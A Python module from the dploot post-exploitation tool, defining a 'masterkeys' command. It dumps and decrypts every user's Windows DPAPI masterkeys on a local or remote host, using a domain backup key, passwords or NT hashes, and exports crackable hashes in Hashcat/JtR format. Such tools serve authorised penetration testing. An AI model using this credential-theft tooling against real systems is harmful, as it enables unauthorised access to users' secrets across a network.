import argparse
import logging
from typing import Callable, Tuple

from dploot.action import DPLootAction
from dploot.lib.target import add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.masterkeys import MasterkeysTriage


NAME = "masterkeys"


class MasterkeysAction(DPLootAction):
    def __init__(self, options: argparse.Namespace) -> None:
        if options.mkfile: # workaround to make sure the file exists
            open(options.mkfile, "a+").close()
        super().init_triage_user(options)

    def run(self) -> None:
        super().run()
        if self.conn.is_admin():
            fd = (
                open(self.mkfile, "a+")
                if self.mkfile is not None
                else None
            )

            def masterkey_callback(masterkey):
                if masterkey.key is not None:
                    masterkey.dump()
                    if fd is not None:
                        fd.write(str(masterkey) + "\n")

            triage = MasterkeysTriage(
                target=self.target,
                conn=self.conn,
                pvkbytes=self.pvkbytes,
                nthashes=self.nthashes,
                passwords=self.passwords,
                per_masterkey_callback=masterkey_callback,
            )
            logging.info("Triage ALL USERS masterkeys\n")
            triage.triage_masterkeys()
            if self.mkfile is not None:
                logging.critical("Writting masterkeys to %s" % self.mkfile)
                fd.close()
            if self.options.hashes_outputfile:
                print()
                with open(self.options.hashes_outputfile, "a+") as hashes_fd:
                    for mkhash in [mkhash for masterkey in triage.all_looted_masterkeys for mkhash in masterkey.generate_hash() ]:
                        print(mkhash)
                        hashes_fd.write(mkhash + "\n")
                    print()
                    logging.critical("Writting masterkey hashes to %s" % self.options.hashes_outputfile)
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, triage.looted_files)
        else:
            logging.info("Not an admin, exiting...")

def entry(options: argparse.Namespace) -> None:
    a = MasterkeysAction(options)
    a.run()

def add_masterkeys_argument_group(group: argparse._ArgumentGroup) -> None:
    group.add_argument(
        "-pvk",
        action="store",
        help=("Pvk file with domain backup key"),
    )

    group.add_argument(
        "-passwords",
        action="store",
        help=(
            "File containing username:password that will be used eventually to decrypt masterkeys"
        ),
    )

    group.add_argument(
        "-nthashes",
        action="store",
        help=(
            "File containing username:nthash that will be used eventually to decrypt masterkeys"
        ),
    )


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME, help="Dump users masterkey from local or remote target"
    )

    group = subparser.add_argument_group("masterkeys options")

    add_masterkeys_argument_group(group)

    group.add_argument(
        "-mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings. Will append new keys to this file."),
    )

    group.add_argument(
        "-hashes-outputfile",
        action="store",
        help=("Export hashes of masterkeys to file in Hashcat/JtR format"),
    )

    add_target_argument_group(subparser)

    return NAME, entry
